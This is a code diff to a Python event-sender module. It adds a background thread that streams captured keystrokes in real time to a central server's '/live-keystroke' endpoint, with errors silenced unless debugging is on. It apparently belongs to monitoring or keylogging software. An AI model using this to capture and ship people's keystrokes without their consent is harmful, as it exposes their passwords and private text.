@@ -5,6 +5,7 @@ Sends events to central server
 import requests
 import threading
 import time
+import queue
 from typing import List
 from datetime import datetime
 
@@ -25,6 +26,10 @@ class EventSender:
         
         self.heartbeat_thread = None
         self.running = False
+        
+        # Live keystroke queue for non-blocking sends
+        self.live_queue = queue.Queue(maxsize=1000)
+        self.live_sender_thread = None
     
     def _get_api_url(self, endpoint: str) -> str:
         """Build API URL"""
@@ -107,6 +112,54 @@ class EventSender:
                 print(f"Send error: {e}")
             return False
     
+    def send_live_keystroke(self, event: dict):
+        """
+        Queue a live keystroke for immediate sending.
+        Non-blocking - adds to queue and returns immediately.
+        """
+        try:
+            self.live_queue.put_nowait(event)
+        except queue.Full:
+            # Queue is full, drop oldest and add new
+            try:
+                self.live_queue.get_nowait()
+                self.live_queue.put_nowait(event)
+            except:
+                pass
+    
+    def _live_sender_loop(self):
+        """Background thread to send live keystrokes immediately"""
+        while self.running:
+            try:
+                # Get keystroke from queue with timeout
+                event = self.live_queue.get(timeout=0.1)
+                
+                if not self.config.api_key:
+                    continue
+                
+                try:
+                    self.session.headers['X-API-Key'] = self.config.api_key
+                    
+                    # Send to dedicated live endpoint for minimal latency
+                    response = self.session.post(
+                        self._get_api_url('/live-keystroke'),
+                        json=event,
+                        timeout=2  # Short timeout for live data
+                    )
+                    
+                    if DEBUG_MODE and response.status_code != 200:
+                        print(f"Live keystroke send failed: {response.status_code}")
+                        
+                except requests.RequestException as e:
+                    if DEBUG_MODE:
+                        print(f"Live keystroke error: {e}")
+                        
+            except queue.Empty:
+                continue
+            except Exception as e:
+                if DEBUG_MODE:
+                    print(f"Live sender error: {e}")
+    
     def _heartbeat_loop(self):
         """Background thread for heartbeat"""
         while self.running:
@@ -130,7 +183,7 @@ class EventSender:
             time.sleep(HEARTBEAT_INTERVAL)
     
     def start_heartbeat(self):
-        """Start the heartbeat thread"""
+        """Start the heartbeat thread and live keystroke sender"""
         if self.running:
             return
         
@@ -138,13 +191,17 @@ class EventSender:
         self.heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
         self.heartbeat_thread.start()
         
+        # Start live keystroke sender thread
+        self.live_sender_thread = threading.Thread(target=self._live_sender_loop, daemon=True)
+        self.live_sender_thread.start()
+        
         if DEBUG_MODE:
-            print("Heartbeat started")
+            print("Heartbeat and live sender started")
     
     def stop_heartbeat(self):
-        """Stop the heartbeat thread"""
+        """Stop the heartbeat thread and live keystroke sender"""
         self.running = False
         
         if DEBUG_MODE:
-            print("Heartbeat stopped")
+            print("Heartbeat and live sender stopped")
 
